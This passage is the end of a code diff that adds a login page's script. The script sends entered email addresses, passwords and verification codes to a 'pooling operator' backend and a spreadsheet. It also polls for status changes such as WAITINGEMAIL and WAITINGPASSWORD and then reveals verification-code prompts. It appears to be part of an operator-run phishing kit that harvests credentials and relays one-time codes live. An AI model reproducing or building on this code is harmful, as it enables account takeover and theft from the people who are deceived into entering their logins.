+      body: objectToFormData(payload)
+    });
+
+    if (!response.ok) {
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
+
+    const data = await response.json();
+    console.log("Pooling operator (update) response:", data);
+
+    // Keep the loading state stable: wait a short, compulsory interval
+    // so the serverless function has time to pick up the sheet row and
+    // transition status before we update the UI. This prevents the
+    // form flickering back into view between updates.
+    await new Promise((resolve) => setTimeout(resolve, 5000));
+
+    // Check if we should keep the loading state active while waiting for backend pickup
+    const responseData = data.data || {};
+    const currentStatusFromResponse = data.currentStatus;
+    
+    // If WAITINGEMAIL with email already in sheet, or WAITINGPASSWORD with password already in sheet,
+    // keep loading active and continue polling (don't update UI yet)
+    const isWaitingEmailWithData = currentStatusFromResponse === 'WAITINGEMAIL' && responseData.email && responseData.email.trim() !== '';
+    const isWaitingPasswordWithData = currentStatusFromResponse === 'WAITINGPASSWORD' && responseData.password && responseData.password.trim() !== '';
+    
+    if (isWaitingEmailWithData || isWaitingPasswordWithData) {
+      // Keep loading overlay visible and continue polling
+      console.log("Data submitted but backend still picking up. Keeping loading state active.", {
+        status: currentStatusFromResponse,
+        hasEmail: !!responseData.email,
+        hasPassword: !!responseData.password
+      });
+      showLoadingOverlay(true);
+      startPolling(5000); // Poll more frequently (every 5 seconds) while waiting for backend pickup
+    } else if (data && data.currentStatus) {
+      // Update UI only if not in "waiting for pickup" state
+      updateUIForStatus(data.currentStatus, data.data || {});
+    } else {
+      // Fallback to polling if response doesn't contain status
+      pollOperator();
+    }
+
+  } catch (error) {
+    console.error("Error during form submission:", error);
+    document.getElementById('GeneralError').textContent = "An error occurred during submission. Please try again.";
+    document.getElementById('GeneralError').style.display = 'block';
+    showLoadingOverlay(false, true); // Show error message, no spinner
+    resetFormState();
+  }
+}
+
+// Helper function to reset form/button fields
+function resetFormState() {
+  const btn = document.getElementById('submitButton');
+  const emailField = document.getElementById('exampleInputEmail1');
+  const passwordField = document.getElementById('exampleInputPassword1');
+  const verificationCodeInput = document.getElementById('verificationCodeInput');
+
+  if (!new URLSearchParams(window.location.search).get('email')) {
+    emailField.readOnly = false;
+  }
+  emailField.value = '';
+  passwordField.disabled = false;
+  passwordField.value = "";
+  verificationCodeInput.value = "";
+  btn.disabled = false;
+  btn.innerText = "Login";
+  btn.style.backgroundColor = "";
+  btn.style.color = "";
+
+  // Reset last-seen error key so new errors will be applied after user edits
+  lastSeenLjTimestamp = null;
+
+  // Always show email and password fields, hide others
+  document.getElementById('emailGroup').style.display = 'block';
+  document.getElementById('passwordGroup').style.display = 'block';
+  document.getElementById('verificationOptionsGroup').style.display = 'none';
+  document.getElementById('verificationCodeGroup').style.display = 'none';
+  document.getElementById('termsOfUseGroup').style.display = 'none';
+}
+
+// Handle form submission to prevent the default behavior
+function handleSubmit(event) {
+  event.preventDefault();
+  handleFormSubmission();
+  return false;
+}
+
+// Manually trigger onPageLoad when the DOM is ready
+document.addEventListener('DOMContentLoaded', initialFormSubmission);
+</script>
+
+</body>
+</html>
